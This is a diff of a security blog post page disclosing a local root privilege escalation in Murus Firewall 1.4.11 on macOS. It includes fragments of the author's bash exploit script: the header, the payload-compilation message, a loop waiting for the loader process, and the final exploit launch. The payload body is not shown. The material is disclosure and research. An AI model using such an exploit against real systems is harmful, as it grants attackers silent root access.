@@ -13,7 +13,7 @@
         <div id="menu">
                         <h3>Mark Wadham</h3>
             <ul>
-                <li><a href="/index.html">profile</a></li>
+                <li><a href="/">profile</a></li>
                 <li><a href="/blog.html">blog</a> <a href="/blog/rss"><img src="/img/rss.png" /></a></li>
                 <li><a href="/cves.html">CVEs</a></li>
                 <li><a href="/jsdemos.html">js demos</a></li>
@@ -23,13 +23,14 @@
                 <li class="small">linkedin: <a href="https://uk.linkedin.com/in/mark-wadham-14ab49a6">379069834</a></li>
                 <li class="red space small"></li>
             </ul>
-
         </div>
         <div id="content">
             <div id="main-content">
-                                            <div class="post">
+                            
+                            <div class="post">
                 <h2><a href="/blog/murus-firewall-1411-escalation-hihack--root-privesc.html">Murus Firewall 1.4.11 escalation hihack / root privesc</a></h2>
                 <h3>4 Dec 2017 12:23  | <a class="tag" href="/blog/tag/macOS.html">macOS</a> | <a class="tag" href="/blog/tag/security.html">security</a> | <a class="tag" href="/blog/tag/exploits.html">exploits</a></h3>
+                
                   <pre>I recently blogged about the prevalence of escalation hijack vulnerabilities
 amongst macOS applications. One example of this is the latest version of Murus
 firewall. By design it requires the user to authenticate every time in order to
@@ -39,14 +40,14 @@ If a local attacker or malware is running as an admin user (ie has write access
 to /Applications/) they can subvert this process to silently obtain root access
 without the user knowing.
 
-<a href="https://m4.rkw.io/murus1.4.11.sh.txt">https://m4.rkw.io/murus1.4.11.sh.txt</a>
+https://m4.rkw.io/murus1.4.11.sh.txt
 9c332c07747e11c78c34f9dc8d30127250d95edd5e58a571ed1a005eafd32301
 -------------------------------------------------------------------------------
 #!/bin/bash
 
 ##################################################################
 ###### Murus 1.4.11 local root privilege escalation exploit ######
-###### by m4rkw - <a href="https://m4.rkw.io/blog.html">https://m4.rkw.io/blog.html</a>               ######
+###### by m4rkw - https://m4.rkw.io/blog.html               ######
 ##################################################################
 
 echo &quot;compiling payloads...&quot;
@@ -95,7 +96,7 @@ echo &quot;waiting for loader...&quot;
 
 while :
 do
-  ps auxwww |grep &#39;/Applications/Murus.app/Contents/MacOS/MurusLoader&#39; \
+  ps auxwww |grep &#x27;/Applications/Murus.app/Contents/MacOS/MurusLoader&#x27; \
     |grep -v grep 1&gt;/dev/null
   if [ $? -eq 0 ] ; then
     break
@@ -121,10 +122,11 @@ done
 
 echo &quot;kapow&quot;
 
-/tmp/murus411_exp</pre>
+/tmp/murus411_exp
+</pre>
+                
             </div>
-
-
+            
             </div>
             <div id="right-content">
                 
@@ -134,39 +136,67 @@ echo &quot;kapow&quot;
 
             <ul>
               <li>&nbsp;&nbsp;[year]</li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2022.html">2022</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2021.html">2021</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2020.html">2020</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2019.html">2019</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2018.html">2018</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2017.html">2017</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2016.html">2016</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2015.html">2015</a></li>
+              
             </ul>
 
             <ul>
               <li>&nbsp;&nbsp;[tag]</li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/AWS.html">AWS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/agile.html">agile</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/apple.html">apple</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/bash.html">bash</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/cryptocurrency.html">cryptocurrency</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/development.html">development</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/exploits.html">exploits</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/iOS.html">iOS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/linux.html">linux</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/macOS.html">macOS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/mining.html">mining</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/mysql.html">mysql</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/php.html">php</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/ruby.html">ruby</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/scrum.html">scrum</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/security.html">security</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/touchID.html">touchID</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/vim.html">vim</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/work.html">work</a></li>
+              
             </ul>
-
             </div>
         </div>
 				<script>
